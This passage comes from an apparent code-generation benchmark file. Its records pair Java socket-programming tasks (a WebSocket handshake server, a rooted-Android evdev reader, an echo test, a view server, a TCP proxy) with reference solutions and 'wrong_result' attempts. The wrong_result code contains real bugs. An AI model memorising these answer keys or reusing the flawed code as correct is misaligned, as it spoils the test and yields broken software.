StringBuilder();\n            String line;\n            while ((line = in.readLine()) != null) {\n                request.append(line).append(\"\\n\");\n            }\n            String response = \"Response at \" + new java.util.Date().toString();\n            out.println(response);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 534,
    "Instruction": "Task Description: Implement a WebSocket handshake server in Java that handles various test cases for WebSocket connection upgrades. The server should listen on a specified port, accept client connections, and respond with different HTTP responses based on the requested test case.\n\nClass Description: WebSocketHandshakeServer is a TCP server that simulates WebSocket handshake responses for testing purposes. It creates a ServerSocket to listen for incoming connections and handles each client connection in a separate thread, responding with different HTTP responses based on the requested test case path.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- port: int - The port number on which the server listens for connections\n- additionalHandshake: String - Constant string containing additional handshake headers required for WebSocket upgrade\n\nMethods:\n- WebSocketHandshakeServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server, creates a ServerSocket, and begins accepting client connections in a new thread\n- stop() -> void - Stops the server by closing the ServerSocket if it's open\n- handleClientConnection(Socket client) -> void - Handles an individual client connection, reads the request, and sends the appropriate response based on the test case\n- asciiBytes(String input) -> byte[] - Helper method that converts a string to ASCII bytes for network transmission",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class WebSocketHandshakeServer {\n\n    private static final String additionalHandshake = \"Upgrade: websocket\\r\\nConnection: Upgrade\\r\\n\\r\\n\";\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketHandshakeServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n        \n        new Thread(() -> {\n            while (!serverSocket.isClosed()) {\n                try {\n                    Socket client = serverSocket.accept();\n                    handleClientConnection(client);\n                } catch (IOException e) {\n                    if (!serverSocket.isClosed()) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }).start();\n    }\n\n    private void handleClientConnection(Socket client) throws IOException {\n        try (Scanner in = new Scanner(client.getInputStream());\n             OutputStream os = client.getOutputStream()) {\n            \n            String input = in.nextLine();\n            String testCase = input.split(\" \")[1];\n            \n            switch (testCase) {\n                case \"/0\":\n                    os.write(asciiBytes(\"HTTP/1.1 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/1\":\n                    os.write(asciiBytes(\"HTTP/1.0 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/2\":\n                    os.write(asciiBytes(\"HTTP 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/3\":\n                    os.write(asciiBytes(\"HTTP/1.1 200 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/4\":\n                    os.write(asciiBytes(\"HTTP 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/5\":\n                    os.write(asciiBytes(\"HTTP/1.1 404 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/6\":\n                    os.write(asciiBytes(\"HTTP/2.0 404 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/7\":\n                    os.write(asciiBytes(\"HTTP/1.1 500 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/8\":\n                    os.write(asciiBytes(\"GET 302 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/9\":\n                    os.write(asciiBytes(\"GET HTTP/1.1 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/10\":\n                    os.write(asciiBytes(\"HTTP/1.1 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/11\":\n                    os.write(asciiBytes(\"HTTP/1.1 101 Websocket Connection Upgrade\\r\\n\" + additionalHandshake));\n                    break;\n            }\n            os.flush();\n        } finally {\n            client.close();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n    }\n\n    private byte[] asciiBytes(String input) {\n        return input.getBytes(java.nio.charset.StandardCharsets.US_ASCII);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class WebSocketHandshakeServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private static final String ADDITIONAL_HANDSHAKE = \"test-header\";\n\n    public WebSocketHandshakeServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(() -> {\n                while (true) {\n                    try {\n                        Socket client = serverSocket.accept();\n                        new Thread(this::handleClientConnection, \"WebSocketHandler\").start();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (serverSocket != null && serverSocket.isBound()) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void handleClientConnection(Socket client) {\n        try (InputStream input = client.getInputStream();\n             OutputStream output = client.getOutputStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            StringBuilder request = new StringBuilder();\n            while ((bytesRead = input.read(buffer)) != -1) {\n                request.append(new String(buffer, 0, bytesRead));\n            }\n            String requestLine = request.toString().trim();\n            String[] parts = requestLine.split(\"\\\\s+\");\n            String path = parts[1];\n            \n            String response;\n            if (path.equals(\"/test1\")) {\n                response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                           \"Upgrade: websocket\\r\\n\" +\n                           \"Connection: Upgrade\\r\\n\" +\n                           \"Sec-WebSocket-Additional: \" + ADDITIONAL_HANDSHAKE + \"\\r\\n\\r\\n\";\n            } else if (path.equals(\"/test2\")) {\n                response = \"HTTP/1.1 200 OK\\r\\n\" +\n                           \"Content-Type: text/plain\\r\\n\" +\n                           \"Content-Length: 13\\r\\n\\r\\n\" +\n                           \"Hello, World!\";\n            } else {\n                response = \"HTTP/1.1 404 Not Found\\r\\n\\r\\n\";\n            }\n            \n            byte[] responseBytes = asciiBytes(response);\n            output.write(responseBytes);\n            output.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private byte[] asciiBytes(String input) {\n        return input.getBytes(StandardCharsets.US_ASCII);\n    }\n}"
  },
  {
    "Task_id": 535,
    "Instruction": "Task Description: Implement an Android input capture provider that uses TCP socket communication to interface with a native evdev reader process for handling input events from rooted devices.\n\nClass Description: EvdevCaptureProvider is an Android input capture implementation that establishes a TCP server to communicate with a native evdev reader process running with root privileges. It handles input event capture and forwarding while managing the lifecycle of the socket connection and root process.\n\nAttributes:\n- listener: [EvdevListener] - Callback interface for handling input events\n- libraryPath: [String] - Path to the native library directory\n- shutdown: [boolean] - Flag indicating whether the provider should terminate\n- evdevIn: [InputStream] - Input stream from the evdev reader socket\n- evdevOut: [OutputStream] - Output stream to the evdev reader socket\n- su: [Process] - Root process running the evdev reader\n- servSock: [ServerSocket] - TCP server socket for accepting connections\n- evdevSock: [Socket] - Socket connection to the evdev reader\n- activity: [Activity] - Android activity context\n- started: [boolean] - Flag indicating if the provider has started\n- handlerThread: [Thread] - Thread handling the socket communication\n\nMethods:\n- EvdevCaptureProvider([Activity activity, EvdevListener listener]) -> [void] - Constructor that initializes the capture provider with activity context and event listener\n- destroy() -> [void] - Cleans up resources including sockets, streams, and terminates the root process\n- reportDeviceNotRooted() -> [void] - Displays a toast message when the device isn't rooted (private helper method)\n- run() -> [void] - Thread implementation that establishes the server socket, launches the root process, and handles event reading (inner Thread class method)",
    "Canonical_solution": "import android.app.Activity;\nimport android.os.Build;\nimport android.os.Looper;\nimport android.widget.Toast;\n\nimport com.limelight.LimeLog;\nimport com.limelight.binding.input.capture.InputCaptureProvider;\n\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EvdevCaptureProvider extends InputCaptureProvider {\n\n    private final EvdevListener listener;\n    private final String libraryPath;\n\n    private boolean shutdown = false;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started = false;\n\n    private static final byte UNGRAB_REQUEST = 1;\n    private static final byte REGRAB_REQUEST = 2;\n\n    private final Thread handlerThread = new Thread() {\n        @Override\n        public void run() {\n            try {\n                servSock = new ServerSocket(0, 1);\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n\n            final String evdevReaderCmd = libraryPath+File.separatorChar+\"libevdev_reader.so \"+servSock.getLocalPort();\n\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                try {\n                    su = new ProcessBuilder(\"su\", \"-c\", evdevReaderCmd).start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n            else {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                try {\n                    su = builder.start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n\n                DataOutputStream suOut = new DataOutputStream(su.getOutputStream());\n                try {\n                    suOut.writeChars(evdevReaderCmd+\"\\n\");\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n\n            LimeLog.info(\"Waiting for EvdevReader connection to port \"+servSock.getLocalPort());\n            try {\n                evdevSock = servSock.accept();\n                evdevIn = evdevSock.getInputStream();\n                evdevOut = evdevSock.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n            LimeLog.info(\"EvdevReader connected from port \"+evdevSock.getPort());\n\n            while (!isInterrupted() && !shutdown) {\n                EvdevEvent event;\n                try {\n                    event = EvdevReader.read(evdevIn);\n                } catch (IOException e) {\n                    event = null;\n                }\n                if (event == null) {\n                    break;\n                }\n            }\n        }\n    };\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.listener = listener;\n        this.activity = activity;\n        this.libraryPath = activity.getApplicationInfo().nativeLibraryDir;\n    }\n\n    private void reportDeviceNotRooted() {\n        activity.runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                Toast.makeText(activity, \"This device is not rooted - Mouse capture is unavailable\", Toast.LENGTH_LONG).show();\n            }\n        });\n    }\n\n    @Override\n    public void destroy() {\n        if (!started) {\n            return;\n        }\n\n        shutdown = true;\n        handlerThread.interrupt();\n\n        if (servSock != null) {\n            try {\n                servSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevSock != null) {\n            try {\n                evdevSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevIn != null) {\n            try {\n                evdevIn.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevOut != null) {\n            try {\n                evdevOut.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (su != null) {\n            su.destroy();\n        }\n\n        try {\n            handlerThread.join();\n        } catch (InterruptedException ignored) {}\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EvdevCaptureProvider implements Runnable {\n    private EvdevListener listener;\n    private String libraryPath = \"/data/local/tmp/evdev_reader.so\";\n    private boolean shutdown = false;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started = false;\n    private Thread handlerThread;\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.activity = activity;\n        this.listener = listener;\n        handlerThread = new Thread(this);\n        handlerThread.start();\n    }\n\n    public void destroy() {\n        if (su != null) {\n            su.destroy();\n        }\n        if (evdevIn != null) {\n            try {\n                evdevIn.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (evdevOut != null) {\n            try {\n                evdevOut.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (servSock != null) {\n            try {\n                servSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (evdevSock != null) {\n            try {\n                evdevSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        shutdown = true;\n    }\n\n    private void reportDeviceNotRooted() {\n        if (activity != null) {\n            activity.runOnUiThread(() -> {\n                Toast.makeText(activity, \"Device not rooted\", Toast.LENGTH_SHORT).show();\n            });\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            servSock = new ServerSocket(12345);\n            // Check if root is available\n            ProcessBuilder pbCheck = new ProcessBuilder(\"su\");\n            pbCheck.redirectErrorStream(true);\n            Process suCheck = pbCheck.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(suCheck.getInputStream()));\n            String line;\n            if ((line = reader.readLine()) == null || !line.contains(\"su\")) {\n                reportDeviceNotRooted();\n                return;\n            }\n            suCheck.waitFor();\n            // Start the evdev reader process\n            ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", \"/data/local/tmp/evdev_reader\");\n            pb.redirectErrorStream(true);\n            su = pb.start();\n            // Accept connection\n            evdevSock = servSock.accept();\n            evdevIn = evdevSock.getInputStream();\n            evdevOut = evdevSock.getOutputStream();\n            // Read events\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while (!shutdown) {\n                bytesRead = evdevIn.read(buffer);\n                if (bytesRead > 0) {\n                    listener.onEvent(buffer, bytesRead);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (servSock != null) {\n                try {\n                    servSock.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (su != null) {\n                su.destroy();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 536,
    "Instruction": "Task Description: Demonstrate basic TCP socket communication between a server and client using Java's ServerSocket and Socket classes. The server should echo back any data received from the client.\n\nFunction Description: The function establishes a TCP server that listens on port 5678, accepts a client connection, reads data from the client, writes the same data back (echo), and then closes the connection. Simultaneously, it creates a client that connects to this server, sends a test message, and verifies the echoed response.\n\nInput: None (The function uses hardcoded values for demonstration purposes)\n\nOutput: None (The function performs communication internally and handles errors through fail() calls)\n\n---\n\nNote: Since the reference code shows a complete test scenario (both server and client) implemented as a single function with internal threading rather than separate reusable components, I've described it at the function level. If you'd prefer this to be split into proper class definitions for Server and Client components, please let me know and I can provide that alternative structure instead.",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic void testServerSocketCommunication() {\n    Thread listener = new Thread(new Runnable() {\n        @Override\n        public void run() {\n            ServerSocket s = null;\n            try {\n                s = new ServerSocket(5678);\n            } catch (IOException e) {\n                fail(\"exception creating ServerSocket\");\n            }\n\n            byte[] recv = new byte[800];\n\n            Socket peer = null;\n            try {\n                peer = s.accept();\n            } catch (IOException e) {\n                fail(\"accept failed\");\n            }\n\n            InputStream is = peer.getInputStream();\n            OutputStream os = peer.getOutputStream();\n\n            int recvLen = 0;\n            try {\n                recvLen = is.read(recv);\n            } catch (IOException e) {\n                fail(\"read failed\");\n            }\n\n            try {\n                os.write(recv, 0, recvLen);\n            } catch (IOException e) {\n                fail(\"write failed\");\n            }\n\n            try {\n                peer.close();\n                s.close();\n            } catch (IOException e) {\n                fail(\"close failed\");\n            }\n        }\n    });\n    listener.start();\n\n    Socket s = null;\n    try {\n        s = new Socket();\n        s.bind(new InetSocketAddress(\"192.168.0.3\", 0));\n    } catch (IOException e) {\n        fail(\"new socket failed\");\n    }\n\n    try {\n        s.connect(new InetSocketAddress(\"192.168.0.3\", 5678));\n    } catch (IOException e) {\n        fail(\"connect failed\");\n    }\n\n    byte[] send = \"Hello, World!\".getBytes();\n    InputStream is = s.getInputStream();\n    OutputStream os = s.getOutputStream();\n\n    try {\n        os.write(send);\n    } catch (IOException e) {\n        fail(\"exception sending on Socket\");\n    }\n\n    byte[] recv = new byte[800];\n    int recvLen = 0;\n    try {\n        recvLen = is.read(recv);\n    } catch (IOException e) {\n        fail(\"exception receiving on DatagramSocket\");\n    }\n\n    try {\n        listener.join();\n    } catch (InterruptedException e) {\n    }\n\n    try {\n        s.close();\n    } catch (IOException e) {\n        fail(\"close failed\");\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TCPCommunicationTest {\n    public void testTCPCommunication() {\n        new Thread(() -> {\n            try {\n                ServerSocket serverSocket = new ServerSocket(5678);\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    out.println(inputLine);\n                }\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n\n        try {\n            Socket socket = new Socket(\"localhost\", 5678);\n            OutputStream out = socket.getOutputStream();\n            InputStream in = socket.getInputStream();\n            OutputStreamWriter writer = new OutputStreamWriter(out);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n            writer.write(\"Hello, Server!\\n\");\n            writer.flush();\n            String response = reader.readLine();\n            if (!response.equals(\"Hello, Server!\")) {\n                throw new RuntimeException(\"Echo mismatch: expected 'Hello, Server!', got '\" + response + \"'\");\n            }\n            socket.close();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Connection failed\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 538,
    "Instruction": "Task Description: Create a TCP server class that handles multiple client connections concurrently, processes incoming requests, and sends responses back to clients.\n\nClass Description: The ViewServer class implements a multi-threaded TCP server that listens on a specified port, accepts client connections, and processes client requests using a thread pool. Each client connection is handled by a separate worker thread.\n\nAttributes:\n- VIEW_SERVER_MAX_CONNECTIONS: [int] - Maximum number of concurrent client connections allowed\n- mServer: [ServerSocket] - Server socket instance for accepting client connections\n- mPort: [int] - Port number on which the server listens\n- mThread: [Thread] - Main server thread\n- mThreadPool: [ExecutorService] - Thread pool for handling client connections\n\nMethods:\n- ViewServer([int port]) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [boolean] - Starts the server thread and thread pool, returns true if successful\n- run() -> [void] - Main server loop that accepts client connections and delegates to worker threads\n- writeValue([Socket client, String value]) -> [boolean] - Helper method to write a response to a client socket\n- ViewServerWorker([Socket client]) -> [void] - Nested class constructor for handling individual client connections\n- run() -> [void] - Worker thread method that processes client requests and sends responses",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    @Override\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            return;\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                break;\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        private ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        @Override\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                String command;\n                String parameters;\n\n                int index = request.indexOf(' ');\n                if (index == -1) {\n                    command = request;\n                    parameters = \"\";\n                } else {\n                    command = request.substring(0, index);\n                    parameters = request.substring(index + 1);\n                }\n\n                boolean result = writeValue(mClient, \"RESPONSE\");\n            } catch (IOException e) {\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ViewServer {\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        mPort = port;\n        try {\n            mServer = new ServerSocket(port);\n            mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean start() {\n        if (mServer == null) {\n            return false;\n        }\n        mThread = new Thread(this);\n        mThread.start();\n        return true;\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket client = mServer.accept();\n                mThreadPool.execute(new ViewServerWorker(client));\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n\n    private boolean writeValue(Socket client, String value) {\n        try (PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {\n            out.println(value);\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private final Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                 PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    if (inputLine.trim().isEmpty()) {\n                        break;\n                    }\n                    String response = \"Received: \" + inputLine;\n                    writeValue(client, response);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 539,
    "Instruction": "Task Description: Create a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections.\n\nClass Description: The ConnectionManipulationProxyServer class implements a TCP proxy server that listens on a local port, accepts client connections, and forwards traffic to a specified remote server. It provides thread-safe control over the proxy operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port number the proxy listens on\n- host: [String] - The hostname or IP address of the remote server\n- remotePort: [int] - The port number of the remote server\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization object for thread-safe control\n- enableProxy: [boolean] - Flag indicating whether proxy is enabled\n- running: [boolean] - Flag indicating whether proxy thread should continue running\n- client: [Socket] - Socket for client connection\n- server: [Socket] - Socket for server connection\n- serverSocket: [ServerSocket] - Server socket for accepting client connections\n\nMethods:\n- ConnectionManipulationProxyServer(String host, int remotePort, int localPort) -> [void] - Constructor that initializes the proxy server with target host and ports\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread implementation that handles connection forwarding\n- getLocalPort() -> [int] - Returns the local port number the proxy is listening on",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    Socket client = null, server = null;\n    ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            boolean canIrun = true;\n            \n            while (running) {\n                synchronized (enableLock) {\n                    canIrun = enableProxy;\n                }\n                \n                while (canIrun) {\n                    synchronized (enableLock) {\n                        canIrun = enableProxy;\n                        if (!enableProxy) {\n                            break;\n                        }\n                    }\n                    \n                    if (serverSocket == null || serverSocket.isClosed()) {\n                        serverSocket = new ServerSocket(localPort);\n                        localPort = serverSocket.getLocalPort();\n                    }\n                    \n                    log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    \n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "class ConnectionManipulationProxyServer {\n    private String host;\n    private int remotePort;\n    private int localPort;\n    private Thread proxyThread;\n    private Object enableLock;\n    private boolean enableProxy;\n    private boolean running;\n    private Socket client;\n    private Socket server;\n    private ServerSocket serverSocket;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.host = host;\n        this.remotePort = remotePort;\n        this.localPort = localPort;\n        this.proxyThread = new Thread(this::run);\n        this.enableLock = new Object();\n        this.enableProxy = false;\n        this.running = false;\n        try {\n            this.serverSocket = new ServerSocket(localPort);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startProxy() {\n        synchronized (enableLock) {\n            if (!enableProxy) {\n                enableProxy = true;\n                running = true;\n                proxyThread.start();\n            }\n        }\n    }\n\n    public void stopProxy() {\n        synchronized (enableLock) {\n            if (enableProxy) {\n                running = false;\n                enableProxy = false;\n                proxyThread.interrupt();\n            }\n        }\n        killOpenSockets();\n    }\n\n    public void killOpenSockets() {\n        try {\n            if (serverSocket != null) serverSocket.close();\n            if (client != null) client.close();\n            if (server != null) server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (running) {\n            try {\n                client = serverSocket.accept();\n                server = new Socket(host, remotePort);\n                Thread handler = new Thread(() -> {\n                    try {\n                        InputStream clientIn = client.getInputStream();\n                        OutputStream clientOut = client.getOutputStream();\n                        InputStream serverIn = 